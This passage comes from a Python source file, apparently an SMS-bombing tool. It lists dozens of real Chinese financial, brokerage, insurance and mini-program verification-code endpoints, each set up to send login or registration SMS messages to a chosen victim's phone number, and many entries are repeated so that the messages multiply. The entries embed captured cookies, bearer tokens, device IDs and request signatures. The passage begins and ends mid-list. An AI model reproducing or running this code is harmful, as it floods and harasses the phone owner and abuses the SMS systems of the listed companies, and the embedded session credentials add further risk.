    'args': [phone]
},
{
    'name': "WOGOO-RSA-SMS",
    'func': wogoo_send_sms,
    'args': [phone]
},
{
    'name': "BOSERA-MD5-SMS",
    'func': bosera_send_sms,
    'args': [phone]
},
{
    'name': "FOUNDERFU-AES-SMS",
    'func': founderfu_send_sms,
    'args': [phone]
},
{
    'name': "GUANGKEDAI-RSA-MD5",
    'func': guangkedai_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHINAHXZQ-AES-SMS",
    'func': chinahxzq_send_sms,
    'args': [phone]
},
{
    'name': "CHIDUDATA-MD5-SMS",
    'func': chidudata_send_sms,
    'args': [phone]
},
{
    'name': "TONGHUASHUN-FUTURES-SMS",
    'func': tonghuashun_futures_send_sms,
    'args': [phone]
},
{
    'name': "ROMAWAY-TIMER-SMS",
    'func': romaway_send_sms,
    'args': [phone]
},
{
    'name': "ZHONGXINJIANTou-FUTURES-SMS",
    'func': zhongxinjiantou_futures_send_sms,
    'args': [phone]
},
{
  "name": "www.leadfund.com.cn",
  "url": "https://www.leadfund.com.cn/api/provider/account/code",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "ContentType": "application/json;charset=utf-8",
    "salt": "bkgVa6Py51CsdKLn",
    "tag": "BaseLBFRequest",
    "testToken": ""
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json;charset=utf-8",
    "Device-Id": "1982613846572818432",
    "Lead-Protector": "version=5.5.7; ; device.type=ANDROID; device.info=1982613846572818432|OPD2404|2120x3000|15|wifi||oppo|; uri=com.leadbank.lbf.activity.login.LoginActivity; clientTime=20251027090414; salt=bkgVa6Py51CsdKLn; sign=7258bf59880e21c4d9b6f005047df4cfaeccee201f6c01f7dde70deae7d20db1"
  }
},
{
  "name": "cloud.wwgd888.com",
  "url": "https://cloud.wwgd888.com/cloud/api/account/app/phone/login/sms",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "appversion": "4.0.9+8353",
    "appclient": "gd",
    "loginuuid": "545e57b5-6685-41a9-94ab-edf345df70cf",
    "platform": "android",
    "Cookie": "SERVERID=93100dfccc24cce3e4018621b1e2d994|1761660448|1761660446; SERVERCORSID=93100dfccc24cce3e4018621b1e2d994|1761660448|1761660446"
  }
},
{
  "name": "appstore.igwfmc.com:3443",
  "url": "https://appstore.igwfmc.com:3443/sale-support-customer-manage/fds/sms/getSms",
  "method": "POST",
  "json_data": {
    "aFlowNum": 0,
    "appVersion": "2.2.1",
    "apiToken": "",
    "svcVersion": "",
    "aTraceId": "fdsapps_1761675471650",
    "data": {
      "phone": f"{phone}",
      "type": "login"
    },
    "imei": "db1fae2adaacb25c",
    "nativeVersion": "4.8.0",
    "terminalType": "Android"
  },
  "headers": {
    "Host": "appstore.igwfmc.com:3443",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "terminalType": "Android",
    "X-Tingyun-Id": "4Nl_NnGbjwY;c=2;r=1499182308;",
    "X-Tingyun": "c=A|wD9JNk4GH8w;",
    "Cookie": "SESSION=YTVkNGQ1YmQtZjMxNS00ZTE5LWE2NjAtYjZkZmUwZGVkMWI3"
  }
},
{
    'name': "ZHONGLIANG-FUTURES-SMS",
    'func': zhongliang_futures_send_sms,
    'args': [phone]
},
{
  "name": "app.haoguvip.com",
  "url": "https://app.haoguvip.com/e/extend/ahgapi/index.php?m=smsservice&c=sendverifycode",
  "method": "POST",
  "data": {
    "phonenumber": f"{phone}",
    "op_type": "1",
    "version": "2.6.94",
    "uuid": "e17ed415ca775db9ac1723a00e628028",
    "imei": "e17ed415ca775db9ac1723a00e628028",
    "deviceType": "1",
    "os": "1",
    "userid": "",
    "timestamp": "1761676802628",
    "channel": "好股票",
    "token": ""
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "version": "2.6.94",
    "uuid": "e17ed415ca775db9ac1723a00e628028",
    "imei": "e17ed415ca775db9ac1723a00e628028",
    "devicetype": "1",
    "os": "1",
    "userid": "",
    "timestamp": "1761676802626",
    "channel": "%E5%A5%BD%E8%82%A1%E7%A5%A8",
    "token": ""
  }
},
{
  "name": "app.haoguvip.com",
  "url": "https://app.haoguvip.com/e/extend/ahgapi/index.php?m=smsservice&c=sendverifycode",
  "method": "POST",
  "data": {
    "phonenumber": f"{phone}",
    "op_type": "1",
    "version": "2.6.94",
    "uuid": "e17ed415ca775db9ac1723a00e628028",
    "imei": "e17ed415ca775db9ac1723a00e628028",
    "deviceType": "1",
    "os": "1",
    "userid": "",
    "timestamp": "1761676802628",
    "channel": "好股票",
    "token": ""
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "version": "2.6.94",
    "uuid": "e17ed415ca775db9ac1723a00e628028",
    "imei": "e17ed415ca775db9ac1723a00e628028",
    "devicetype": "1",
    "os": "1",
    "userid": "",
    "timestamp": "1761676802626",
    "channel": "%E5%A5%BD%E8%82%A1%E7%A5%A8",
    "token": ""
  }
},
{
    'name': "XUANGUBAO-DOUBLE-SIGN-SMS",
    'func': xuangubao_send_sms,
    'args': [phone]
},
{
    'name': "HENGTAI-FUTURES-SMS",
    'func': hengtai_futures_send_sms,
    'args': [phone]
},
{
  "name": "www.tick.ai",
  "url": "https://www.tick.ai/etf/get_check_code",
  "method": "GET",
  "params": {
    "username": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "www.tick.ai",
  "url": "https://www.tick.ai/etf/get_check_code",
  "method": "GET",
  "params": {
    "username": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "www.tick.ai",
  "url": "https://www.tick.ai/etf/get_check_code",
  "method": "GET",
  "params": {
    "username": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "www.tick.ai",
  "url": "https://www.tick.ai/etf/get_check_code",
  "method": "GET",
  "params": {
    "username": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "www.tick.ai",
  "url": "https://www.tick.ai/etf/get_check_code",
  "method": "GET",
  "params": {
    "username": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "tyb-bry-business-gateway.brypointstone.com",
  "url": "https://tyb-bry-business-gateway.brypointstone.com/bussuser/loginTyb/sendsms",
  "method": "POST",
  "params": {
    "mobile": f"{phone}"
  },
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "sourcefrom": "APP",
    "bry_prod_type": "",
    "platform": "android",
    "contentmodify": "get",
    "clientlogintype": "40",
    "version": "2.15.0",
    "client-type": "gthree2one",
    "device": "{\"model\":\"OPD2404\",\"brand\":\"oneplus\",\"system_version\":{\"securityPatch\":\"2025-02-01\",\"sdkInt\":35,\"release\":\"15\",\"previewSdkInt\":0,\"incremental\":\"U.1c8af84_1a785-8\",\"codename\":\"REL\",\"baseOS\":\"\"},\"device_id\":\"21515e07dcba5ffb\",\"is_real_device\":true,\"cpu\":[\"arm64-v8a\"],\"sdkInt\":35}"
  }
},
{
  "name": "tyb-bry-business-gateway.brypointstone.com",
  "url": "https://tyb-bry-business-gateway.brypointstone.com/bussuser/loginTyb/sendsms",
  "method": "POST",
  "params": {
    "mobile": f"{phone}"
  },
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "sourcefrom": "APP",
    "bry_prod_type": "",
    "platform": "android",
    "contentmodify": "get",
    "clientlogintype": "40",
    "version": "2.15.0",
    "client-type": "gthree2one",
    "device": "{\"model\":\"OPD2404\",\"brand\":\"oneplus\",\"system_version\":{\"securityPatch\":\"2025-02-01\",\"sdkInt\":35,\"release\":\"15\",\"previewSdkInt\":0,\"incremental\":\"U.1c8af84_1a785-8\",\"codename\":\"REL\",\"baseOS\":\"\"},\"device_id\":\"21515e07dcba5ffb\",\"is_real_device\":true,\"cpu\":[\"arm64-v8a\"],\"sdkInt\":35}"
  }
},
{
  "name": "tyb-bry-business-gateway.brypointstone.com",
  "url": "https://tyb-bry-business-gateway.brypointstone.com/bussuser/loginTyb/sendsms",
  "method": "POST",
  "params": {
    "mobile": f"{phone}"
  },
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "sourcefrom": "APP",
    "bry_prod_type": "",
    "platform": "android",
    "contentmodify": "get",
    "clientlogintype": "40",
    "version": "2.15.0",
    "client-type": "gthree2one",
    "device": "{\"model\":\"OPD2404\",\"brand\":\"oneplus\",\"system_version\":{\"securityPatch\":\"2025-02-01\",\"sdkInt\":35,\"release\":\"15\",\"previewSdkInt\":0,\"incremental\":\"U.1c8af84_1a785-8\",\"codename\":\"REL\",\"baseOS\":\"\"},\"device_id\":\"21515e07dcba5ffb\",\"is_real_device\":true,\"cpu\":[\"arm64-v8a\"],\"sdkInt\":35}"
  }
},
{
  "name": "user.wacai.com",
  "url": "https://user.wacai.com/login_api/sms/send",
  "method": "POST",
  "json_data": {
    "mob": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "X-DeviceType": "OnePlus OPD2404",
    "X-Mc": "21000026",
    "X-Md": "de6d0f6e418648f68094e87af4261482",
    "X-OSVer": "Android 15",
    "X-Platform": "125",
    "X-Deviceid": "de6d0f6e418648f68094e87af4261482",
    "X-UUID": "b440b476e4ce4b6d883f89a20b613649",
    "X-Appver": "4.8.3",
    "X-Trace-Id": "5b287a0bddaa4edfab7dd934f8cca49a",
    "Cookie": "session_id=3528814930884a76a54ab0322a8257ca; wctk=; access_token=; X-Access-Token=; X-ACCESS-TOKEN="
  }
},
{
  "name": "ws01.hncaee.com:2051",
  "url": "https://ws01.hncaee.com:2051/uic-frontend/mobileHttpServlet",
  "method": "POST",
  "data": "<?xml version='1.0' encoding='GBK' standalone='yes' ?><MEBS_MOBILE><REQ name=\"user_regist_icode\"><MO>{phone}</MO></REQ></MEBS_MOBILE>",
  "headers": {
    "Host": "ws01.hncaee.com:2051",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "text/xml"
  }
},
{
  "name": "proxcapp.xcsc.com",
  "url": "https://proxcapp.xcsc.com/user/auth/getloginsmscode",
  "method": "POST",
  "json_data": {
    "accId": f"{phone}",
    "accType": 2
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "x-protocol-id": "user%2Fauth%2Fgetloginsmscode",
    "x-request-id": "null",
    "em-sign": "android20240220:19c80f63e43424866ecaa6b45a221c69:6ntTWUH2cj:1761765218022",
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6IkpXVCJ9.eyJ1dWQiOjEwMDAyMzQwMTksInVpZCI6MTAyMTYyNDgsImRpZCI6IjZhOTUyYzJmZTliMjQ2ZDhiOGI2Y2JjOGI0ZjgwMTg1IiwidHlwIjo0LCJhY2MiOiI2YTk1MmMyZmU5YjI0NmQ4YjhiNmNiYzhiNGY4MDE4NSIsInN3dCI6MSwibGd0IjoxNzYxNzY1MjA4MDY0LCJuYmYiOjE3NjE3NjUyMDgsImV4cCI6MTc2MzQ5MzIwOCwiaWF0IjoxNzYxNzY1MjA4fQ.4v9PajhFvHbPI46sojdYAI33RM6CdvZYIhB4IqC2ucg",
    "x-android-agent": "EMAPP/3.1.0(Android;35)",
    "emapp-viewmode": "1",
    "Cookie": "acw_tc=1a1c786617617653166654837ede093b003c36d56daff985dc4b0d120a0fa4; SERVERID=d878b3060314c4a27e0e0a3e4760520a|1761765317|1761765316"
  }
},
{
  "name": "mapi.toutoujinrong.com",
  "url": "https://mapi.toutoujinrong.com/apis/app-tt/acct/sendSms",
  "method": "POST",
  "params": {
    "mobile": f"{phone}",
    "type": "33"
  },
  "json_data": {
    "instId": "LT0000001",
    "accountType": "1",
    "isIndividual": "1",
    "merchantno": "LT0000001"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json;charset=utf-8",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "instid": "LT0000001",
    "requestid": "887d37c5825eb31f"
  }
},
{
  "name": "unifyapp.guominpension.com",
  "url": "https://unifyapp.guominpension.com/publicapi/unifyapp-admin/app/sendCheckSmsCode",
  "method": "POST",
  "json_data": {
    "msgType": "01",
    "mobile": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json;charset=utf-8",
    "lockandlock": "xxx",
    "_ZaServerEncrypt": "1",
    "_IsZaWebEncrypt": "1",
    "_ZaGateWayEncrypt": "0",
    "t": "android",
    "dslDeviceID": "9f4ed233-6a29-43d7-8a8a-0e71f22df7c7",
    "v": "1.6.1",
    "appPushToken": "022205e64067ef434c45646c33683f39b443",
    "osVersion": "15",
    "osDevice": "OPD2404",
    "deviceId": "19b9dea7fb19a3a8",
    "zaid": "19b9dea7fb19a3a8",
    "bizOrigin": "oppo",
    "traceId": "be3739c7-3329-446e-abc1-063317579a14",
    "appCode": "com.guomin.insurance",
    "idfa": "19b9dea7fb19a3a8",
    "sign": "cc37988c6af6bebbcc5c40a54839e404"
  }
},
{
  "name": "api.i-vce.com",
  "url": "https://api.i-vce.com/api/sms/send",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "event": "mobile_login"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "accept-language": "zh-CN,zh;q=0.8",
    "brand": "android",
    "cannel": "oppo",
    "user-invitation-code": "guanwang",
    "udid": "70ecd613aad8bf3c",
    "uuid": "2a2f05c9-8fc2-48d6-88d7-cb6173e8b96f",
    "channel-name": "oppo",
    "app-info": "{\"version_name\":\"3.1.5\",\"version_code\":322,\"android_verison\":\"15\",\"manufacturer\":\"OnePlus\",\"brand\":\"OnePlus\"}",
    "jpushid": "",
    "alideviceid": "1d76eabf093646ee973632b33b1a24c5",
    "version": "3.1.5",
    "platform": "android"
  }
},
{
  "name": "api.crtrust.cn",
  "url": "https://api.crtrust.cn/customer/registerSmsCode",
  "method": "POST",
  "json_data": {
    "requestData": {
      "equipmentNo": "2a3eb7a122401455b18683e0807bafe31761767661155",
      "phoneNum": f"{phone}"
    }
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
    "agent": "2",
    "channelName": "app",
    "channelPwd": "ef538541b0124a6d912af899dde6d57f",
    "version": "2509110"
  }
},
{
  "name": "www.fupanhezi.com",
  "url": "https://www.fupanhezi.com/usercenter/v1/sms/register",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json"
  }
},
{
  "name": "www.glsc.com.cn",
  "url": "https://www.glsc.com.cn/khv4/servlet/json",
  "method": "POST",
  "data": {
    "mobile_no": f"{phone}",
    "verify_code": "",
    "mobileKey": "",
    "funcNo": "501520",
    "op_source": "1",
    "flow_type": "twvideo",
    "ip": "",
    "mac": ""
  },
  "headers": {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "Origin": "https://www.glsc.com.cn",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "JSESSIONID=abchmaGks5f7O_P0zMXOz"
  }
},
{
  "name": "m.xfqh.cn",
  "url": "https://m.xfqh.cn/api/users/getSmsCode",
  "method": "GET",
  "params": {
    "mobile": f"{phone}",
    "verifyParam": ""
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "app": "com.qituitui.niuniu",
    "ver": "3.5.0",
    "ost": "android",
    "osv": "15",
    "oaid": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "uuid": "5443e3155149d541e018a8109641920e",
    "channel": "oppo",
    "pushtoken": "AowWCibWaTfrgm54c2TShAJ7_loxLBrlv81OpLR-YjjH",
    "authorization": ""
  }
},
{
  "name": "webapi.sza.yueniuwang.com",
  "url": "https://webapi.sza.yueniuwang.com/sms/sendCodeByMobile",
  "method": "POST",
  "json_data": {
    "userId": "dc0319018d0d31374f04d885fbf52f20",
    "mobile": f"{phone}",
    "guId": "dc0319018d0d31374f04d885fbf52f20",
    "businessSign": "financial_terminal",
    "uniqueId": None
  },
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI1MzAyNDEiLCJpYXQiOjE3NjE3NzQ0ODYsImV4cCI6MTc2MTc3ODA4Nn0.hQS_sYiQSfyI9LdgADXuQ4piJdrDI6hjJMP739LuWIu32g0pxoIfvylBgVuoXjwtwg50vSbi6SAfUzPkD6FILw",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://webdz.sza.yueniuwang.com",
    "x-requested-with": "dz.astock.djyt.stock",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://webdz.sza.yueniuwang.com/",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i"
  }
},
{
  "name": "webapi.sza.yueniuwang.com",
  "url": "https://webapi.sza.yueniuwang.com/sms/sendCodeByMobile",
  "method": "POST",
  "json_data": {
    "userId": "dc0319018d0d31374f04d885fbf52f20",
    "mobile": f"{phone}",
    "guId": "dc0319018d0d31374f04d885fbf52f20",
    "businessSign": "financial_terminal",
    "uniqueId": None
  },
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI1MzAyNDEiLCJpYXQiOjE3NjE3NzQ0ODYsImV4cCI6MTc2MTc3ODA4Nn0.hQS_sYiQSfyI9LdgADXuQ4piJdrDI6hjJMP739LuWIu32g0pxoIfvylBgVuoXjwtwg50vSbi6SAfUzPkD6FILw",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://webdz.sza.yueniuwang.com",
    "x-requested-with": "dz.astock.djyt.stock",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://webdz.sza.yueniuwang.com/",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i"
  }
},
{
  "name": "webapi.sza.yueniuwang.com",
  "url": "https://webapi.sza.yueniuwang.com/sms/sendCodeByMobile",
  "method": "POST",
  "json_data": {
    "userId": "dc0319018d0d31374f04d885fbf52f20",
    "mobile": f"{phone}",
    "guId": "dc0319018d0d31374f04d885fbf52f20",
    "businessSign": "financial_terminal",
    "uniqueId": None
  },
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI1MzAyNDEiLCJpYXQiOjE3NjE3NzQ0ODYsImV4cCI6MTc2MTc3ODA4Nn0.hQS_sYiQSfyI9LdgADXuQ4piJdrDI6hjJMP739LuWIu32g0pxoIfvylBgVuoXjwtwg50vSbi6SAfUzPkD6FILw",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://webdz.sza.yueniuwang.com",
    "x-requested-with": "dz.astock.djyt.stock",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://webdz.sza.yueniuwang.com/",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i"
  }
},
{
  "name": "webapi.sza.yueniuwang.com",
  "url": "https://webapi.sza.yueniuwang.com/sms/sendCodeByMobile",
  "method": "POST",
  "json_data": {
    "userId": "dc0319018d0d31374f04d885fbf52f20",
    "mobile": f"{phone}",
    "guId": "dc0319018d0d31374f04d885fbf52f20",
    "businessSign": "financial_terminal",
    "uniqueId": None
  },
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI1MzAyNDEiLCJpYXQiOjE3NjE3NzQ0ODYsImV4cCI6MTc2MTc3ODA4Nn0.hQS_sYiQSfyI9LdgADXuQ4piJdrDI6hjJMP739LuWIu32g0pxoIfvylBgVuoXjwtwg50vSbi6SAfUzPkD6FILw",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://webdz.sza.yueniuwang.com",
    "x-requested-with": "dz.astock.djyt.stock",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://webdz.sza.yueniuwang.com/",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i"
  }
},
{
  "name": "webapi.sza.yueniuwang.com",
  "url": "https://webapi.sza.yueniuwang.com/sms/sendCodeByMobile",
  "method": "POST",
  "json_data": {
    "userId": "dc0319018d0d31374f04d885fbf52f20",
    "mobile": f"{phone}",
    "guId": "dc0319018d0d31374f04d885fbf52f20",
    "businessSign": "financial_terminal",
    "uniqueId": None
  },
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI1MzAyNDEiLCJpYXQiOjE3NjE3NzQ0ODYsImV4cCI6MTc2MTc3ODA4Nn0.hQS_sYiQSfyI9LdgADXuQ4piJdrDI6hjJMP739LuWIu32g0pxoIfvylBgVuoXjwtwg50vSbi6SAfUzPkD6FILw",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://webdz.sza.yueniuwang.com",
    "x-requested-with": "dz.astock.djyt.stock",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://webdz.sza.yueniuwang.com/",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i"
  }
},
{
    'name': "PINGAN-FUTURES-SMS",
    'func': pingan_futures_send_sms,
    'args': [phone]
},
{
  "name": "www.fxyf99.com",
  "url": "https://www.fxyf99.com/master/user/sendCode",
  "method": "POST",
  "params": {
    "appVersion": "3.1.0",
    "osVersion": "35",
    "deviceTools": "app"
  },
  "json_data": {
    "mobile": f"{phone}",
    "signature": "61a5272bc0de57b4ee04abaae76ff0a646302404d36e4b3be274f7579afb1249d4b8f565dd0cf40e2ddbead7ecdef40fe6c30a5df603dbc972a2e41f1b376b0360118adafddbbbddd21d03c353855364584f7dbbe19e83732ff824b44dd6e7af"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "deviceType": "OPD2404",
    "Charset": "UTF-8",
    "deviceNo": "d9ef7348e2b5414fa1abb70b7e77f992",
    "version": "3.1.0",
    "platform": "android",
    "timestamp": "1764261324531",
    "Cookie": "$Version=\"1\"; acw_tc=\"1a0c599917642613243984453e942df997d29d1ac72d6cdfc406260e4fe332\";$Path=\"/\";$Domain=\"www.fxyf99.com\""
  }
},
{
    'name': "ZHONGMIN-INSURANCE-SMS",
    'func': zhongmin_insurance_send_sms,
    'args': [phone]
},
{
    'name': "PUPU-FUND-SMS",
    'func': pupu_fund_send_sms,
    'args': [phone]
},
{
    'name': "XIAMENRONGDA-SMS",
    'func': xiamenrongda_send_sms,
    'args': [phone]
},
{
"name": "omp.uopes.cn",
"url": "https://omp.uopes.cn/xcar/omp/xbs/ecommerce/getValidateCode",
"method": "POST",
"json_data": {
"loginName": f"{phone}"
},
"headers": {
"Host": "omp.uopes.cn",
"Connection": "keep-alive",
"pkgName": "app.huawei.mp.motor",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxaf35f7c144fadadb/17/page-frame.html"
}
},
{
"name": "xwtmer2022.dq.cn",
"url": "https://xwtmer2022.dq.cn/retrieve/commonSendVerifyCode",
"method": "POST",
"json_data": {
"BusinessCode": "100",
"CommunicValue": f"{phone}",
"globalRoamingCode": "+86"
},
"headers": {
"Host": "xwtmer2022.dq.cn",
"Connection": "keep-alive",
"X-Requested-With": "XMLHttpRequest",
"content-type": "application/json; charset=UTF-8",
"platformsessionid": "platsession:2025:12:31:0fd9d340-e693-11f0-9011-1df62c54478c-9f658a19-b6ad-4a33-81e5-80e4b8de40aa",
"platform": "102",
"platformhost": "xwtmer2022.dq.cn",
"platformreferer": "https://xwtmer2022.dq.cn",
"device": "10002",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx85e251c7db92c7dc/27/page-frame.html"
}
},
{
"name": "xcx.lzanningwl.cn",
"url": "https://xcx.lzanningwl.cn:50001/prod-api/captchaCode",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Host": "xcx.lzanningwl.cn:50001",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx87effb748222ae68/13/page-frame.html"
}
},
{
"name": "api.czr66.com",
"url": "https://api.czr66.com/car-loan/mini/user/insert",
"method": "POST",
"json_data": {
"name": "史春清",
"phone": f"{phone}",
"area": "江苏省，南京市，玄武区",
"carState": "2",
"appid": "wxc38072812b4200c0"
},
"headers": {
"Host": "api.czr66.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc38072812b4200c0/2/page-frame.html"
}
},
{
"name": "sellerapi.huibihuo.com",
"url": "https://sellerapi.huibihuo.com/api/Jwt/GetVerificationCode",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"ranCode": "948149"
},
"headers": {
"Host": "sellerapi.huibihuo.com",
